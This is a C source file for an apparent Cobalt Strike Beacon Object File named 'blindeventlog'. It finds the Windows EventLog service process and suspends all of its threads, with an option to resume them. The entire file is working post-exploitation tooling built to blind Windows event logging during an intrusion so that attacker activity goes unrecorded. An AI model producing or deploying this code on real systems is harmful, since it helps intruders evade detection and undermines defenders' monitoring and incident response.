/*
 * blindeventlog [resume] - suspend (or resume) the EventLog service threads.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

void go(char *args, int alen)
{
    datap parser;
    char *op = "";
    int a = 0;
    int resume = 0;
    SC_HANDLE scm, svc;
    SERVICE_STATUS_PROCESS st;
    DWORD slen = sizeof(st), pid = 0;
    HANDLE snap;
    THREADENTRY32 te;
    int count = 0;

    if (args && alen > 0) {
        BeaconDataParse(&parser, args, alen);
        op = BeaconDataExtract(&parser, &a);
    }
    if (op && bof_stricmp(op, "resume") == 0) resume = 1;

    scm = ADVAPI32$OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if (!scm) {
        BeaconPrintf(CALLBACK_ERROR, "OpenSCManager failed: %lu\n",
                     (unsigned long)KERNEL32$GetLastError());
        return;
    }
    svc = ADVAPI32$OpenServiceA(scm, "EventLog", SERVICE_QUERY_STATUS);
    if (!svc) {
        BeaconPrintf(CALLBACK_ERROR, "EventLog service not found: %lu\n",
                     (unsigned long)KERNEL32$GetLastError());
        ADVAPI32$CloseServiceHandle(scm);
        return;
    }
    if (ADVAPI32$QueryServiceStatusEx(svc, SC_STATUS_PROCESS_INFO, (LPBYTE)&st,
                                      sizeof(st), &slen))
        pid = st.dwProcessId;
    ADVAPI32$CloseServiceHandle(svc);
    ADVAPI32$CloseServiceHandle(scm);

    if (!pid) {
        BeaconPrintf(CALLBACK_ERROR, "could not resolve EventLog PID\n");
        return;
    }

    snap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) return;

    bof_memzero(&te, sizeof(te));
    te.dwSize = sizeof(te);
    if (KERNEL32$Thread32First(snap, &te)) {
        do {
            HANDLE t;
            if (te.th32OwnerProcessID != pid) continue;
            t = KERNEL32$OpenThread(THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);
            if (!t) continue;
            if (resume) KERNEL32$ResumeThread(t);
            else        KERNEL32$SuspendThread(t);
            KERNEL32$CloseHandle(t);
            count++;
        } while (KERNEL32$Thread32Next(snap, &te));
    }
    KERNEL32$CloseHandle(snap);

    BeaconPrintf(CALLBACK_OUTPUT, "%s %d EventLog thread(s) (PID %lu)\n",
                 resume ? "Resumed" : "Suspended", count, (unsigned long)pid);
}
